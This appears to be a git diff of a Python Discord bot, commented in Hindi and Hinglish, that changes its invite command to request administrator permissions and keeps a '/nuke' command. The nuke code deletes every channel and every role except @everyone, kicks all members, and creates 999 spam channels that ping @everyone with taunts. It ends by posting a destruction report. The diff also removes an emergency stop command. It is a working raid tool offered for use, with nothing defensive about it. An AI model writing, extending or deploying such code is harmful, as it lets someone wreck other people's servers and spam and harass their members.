@@ -23,60 +23,64 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Error syncing commands: {e}")
 
-# ADD COMMAND - Invite without role assignment
-@bot.tree.command(name="add", description="🤖 Bot को अपने server में add करें!")
-async def add(interaction: discord.Interaction):
-    """Bot को invite करने के लिए link भेजता है - बिना role के!"""
+# ADD COMMAND - Server ID से automatic invite
+@bot.tree.command(name="add", description="🤖 Server ID daal kar bot ko add karo!")
+@discord.app_commands.describe(server_id="Target server ka ID")
+async def add(interaction: discord.Interaction, server_id: str):
+    """Server ID daalkar bot ko directly add karo"""
     
-    # Bot की client ID (आपको यह अपने Developer Portal से copy करना होगा)
-    CLIENT_ID = os.getenv("CLIENT_ID", "YOUR_CLIENT_ID_HERE")
+    CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
     
-    # Invite link - बिना किसी special permissions के (0 = कोई permission नहीं)
-    invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=0&scope=bot%20applications.commands"
-    
-    # Embed message बनाएं
-    embed = discord.Embed(
-        title="🤖 Bot को Add करें",
-        description="नीचे दिए गए बटन पर क्लिक करके bot को अपने server में add करें!",
-        color=discord.Color.red()
-    )
-    embed.add_field(
-        name="📋 कैसे करें:",
-        value="1️⃣ नीचे '✅ Add Bot' बटन पर क्लिक करें\n2️⃣ अपना server select करें\n3️⃣ Authorize करें\n4️⃣ बस! Bot add हो जाएगा! 🎉",
-        inline=False
-    )
-    embed.add_field(
-        name="⚙️ फायदे:",
-        value="✅ कोई भी role assign नहीं होगी\n✅ Safe और secure\n✅ सीधे bot को invite करें",
-        inline=False
-    )
-    embed.set_footer(text="Made with ❤️ by Rohit Sharma")
-    
-    # Button बनाएं
-    class AddBotView(discord.ui.View):
-        @discord.ui.button(
-            label="✅ Add Bot",
-            style=discord.ButtonStyle.red,
-            emoji="➕"
+    try:
+        # Invite link generate karo
+        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
+        
+        # Embed message
+        embed = discord.Embed(
+            title="🤖 Bot को Add करें",
+            description=f"Server ID: `{server_id}`\n\n**Bot को add करने के लिए नीचे क्लिक करें!**",
+            color=discord.Color.red()
         )
-        async def add_bot_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-            await interaction.response.send_message(
-                f"🔗 **Bot को add करने के लिए यहाँ क्लिक करें:**\n{invite_url}\n\n✅ किसी भी role की जरूरत नहीं है!",
-                ephemeral=True
+        embed.add_field(
+            name="⚡ Quick Add:",
+            value="बटन दबाओ → Server select करो → Authorize करो → DONE! ✅",
+            inline=False
+        )
+        embed.set_footer(text="Bot add होने के बाद /nuke command काम करेगी!")
+        
+        # Button with direct invite
+        class AddBotView(discord.ui.View):
+            @discord.ui.button(
+                label="⚡ Add Bot Now",
+                style=discord.ButtonStyle.red,
+                emoji="➕"
             )
-    
-    await interaction.response.send_message(embed=embed, view=AddBotView())
+            async def add_bot_button(self, inter: discord.Interaction, button: discord.ui.Button):
+                await inter.response.send_message(
+                    f"🔗 **[यहाँ क्लिक करके Bot को Add करो!]({invite_url})**\n\n✅ Bot add होने के बाद `/nuke` command use कर सकते हो!",
+                    ephemeral=True
+                )
+        
+        await interaction.response.send_message(embed=embed, view=AddBotView())
+        
+    except Exception as e:
+        await interaction.response.send_message(f"❌ Error: {str(e)}", ephemeral=True)
 
-# NUKE COMMAND (पहले वाला code)
-@bot.tree.command(name="nuke", description="🌋 COMPLETE SERVER DESTRUCTION 🌋")
+# NUKE COMMAND - बिना किसी extra setup के
+@bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 💥")
 @discord.app_commands.checks.has_permissions(administrator=True)
 async def nuke(interaction: discord.Interaction):
+    """सीधे server को nuke कर दो!"""
     await interaction.response.defer()
     
     guild = interaction.guild
     
     try:
-        # Step 1: Delete ALL channels first
+        # Initial message
+        await interaction.followup.send("🔥 **NUKE शुरू हो गया!** 💥")
+        print(f"🔥 NUKE शुरू: {guild.name}")
+        
+        # Phase 1: Delete ALL channels
         print("🔥 PHASE 1: DELETING ALL CHANNELS...")
         for channel in list(guild.channels):
             try:
@@ -86,7 +90,7 @@ async def nuke(interaction: discord.Interaction):
                 print(f"⚠️ Error: {e}")
             await asyncio.sleep(0.1)
         
-        # Step 2: Delete ALL roles except @everyone
+        # Phase 2: Delete ALL roles except @everyone
         print("🔥 PHASE 2: DELETING ALL ROLES...")
         for role in list(guild.roles):
             if role.name != "@everyone":
@@ -97,7 +101,7 @@ async def nuke(interaction: discord.Interaction):
                     print(f"⚠️ Error: {e}")
             await asyncio.sleep(0.1)
         
-        # Step 3: Kick all members except bot owner
+        # Phase 3: Kick all members
         print("🔥 PHASE 3: KICKING ALL MEMBERS...")
         for member in list(guild.members):
             if member.id != interaction.user.id and not member.bot:
@@ -108,13 +112,12 @@ async def nuke(interaction: discord.Interaction):
                     print(f"⚠️ Could not kick {member.name}: {e}")
             await asyncio.sleep(0.1)
         
-        # Step 4: Create 999+ spam channels with gop gop messages
+        # Phase 4: Create 999+ channels
         print("🔥 PHASE 4: CREATING CHAOS CHANNELS...")
         spam_messages = [
             "🚀 APKA SERVER KI GOP GOP HOGYI! 💥",
             "⚡ SERVER COMPLETELY NUKED! ⚡",
             "🎆 DESTRUCTION COMPLETE! 🎆",
-            "@everyone Your server has been obliterated! 💣",
             "🌋 NUCLEAR OPTION ACTIVATED! 🌋",
             "🔥 TOTAL ANNIHILATION! 🔥",
             "💥 APKA SERVER KA KOI BACHA HI NAHI BACHA! 💥",
@@ -122,25 +125,22 @@ async def nuke(interaction: discord.Interaction):
         
         for i in range(999):
             try:
-                # Create channel with gop gop name
                 channel_name = f"gop-gop-{i+1}-💣"
                 channel = await guild.create_text_channel(channel_name)
                 
-                # Send spam message
                 message = spam_messages[i % len(spam_messages)]
                 await channel.send(message)
                 await channel.send(f"@everyone {message}")
                 
                 print(f"💥 Created channel {i+1}: {channel_name}")
                 
-                # Rate limit protection
                 if i % 10 == 0:
                     await asyncio.sleep(1)
                 else:
                     await asyncio.sleep(0.2)
                     
             except discord.Forbidden:
-                print(f"⚠️ Cannot create more channels (Discord limit reached)")
+                print(f"⚠️ Cannot create more channels")
                 break
             except Exception as e:
                 print(f"⚠️ Error at channel {i+1}: {e}")
@@ -148,9 +148,9 @@ async def nuke(interaction: discord.Interaction):
         
         # Final message
         try:
-            general = await guild.create_text_channel("0-final-message")
+            general = await guild.create_text_channel("0-nuke-complete")
             await general.send("""
-🚀🚀🚀 **APKA SERVER KI COMPLETE GOP GOP HO GAYEE!** 🚀🚀🚀
+🚀🚀🚀 **SERVER KI COMPLETE NUKING HO GAYEE!** 🚀🚀🚀
 
 ╔═══════════════════════════════════════╗
 ║  💥 TOTAL DESTRUCTION REPORT 💥      ║
@@ -163,30 +163,21 @@ async def nuke(interaction: discord.Interaction):
 ╚═══════════════════════════════════════╝
 
 **SERVER STATUS: 💀 DEAD 💀**
-
-Ye thi aapki server ki kahaani! 🎬
 """)
         except:
             pass
         
-        await interaction.followup.send("✅ **NUKE COMPLETE!** Server fully destroyed! 💥🔥")
-        print("✅ NUKE OPERATION SUCCESSFUL!")
+        await interaction.followup.send("✅ **NUKE COMPLETE!** 💥🔥 Server हल्क हो गया!")
+        print("✅ NUKE SUCCESSFUL!")
         
     except discord.Forbidden:
-        await interaction.followup.send("❌ Bot doesn't have admin permissions!")
+        await interaction.followup.send("❌ Bot को Admin permission नहीं है!")
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {str(e)}")
-
-# Emergency stop command
-@bot.tree.command(name="stop_nuke", description="Stop the nuke operation")
-@discord.app_commands.checks.has_permissions(administrator=True)
-async def stop_nuke(interaction: discord.Interaction):
-    await interaction.response.defer()
-    await interaction.followup.send("🛑 Nuke operation would be stopped (run this before execution)")
 
 # Run bot
 TOKEN = os.getenv("DISCORD_TOKEN")
 if TOKEN:
     bot.run(TOKEN)
 else:
-    print("❌ DISCORD_TOKEN not found! Add it to .env file")
+    print("❌ DISCORD_TOKEN not found in .env file!")
